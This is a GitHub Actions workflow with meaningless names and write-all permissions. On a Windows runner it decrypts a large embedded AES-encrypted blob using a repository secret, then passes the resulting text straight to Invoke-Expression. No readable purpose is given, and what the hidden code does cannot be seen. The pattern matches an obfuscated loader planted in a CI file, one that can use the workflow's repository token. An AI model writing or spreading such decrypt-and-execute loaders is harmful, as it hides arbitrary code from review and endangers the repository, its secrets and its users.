name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
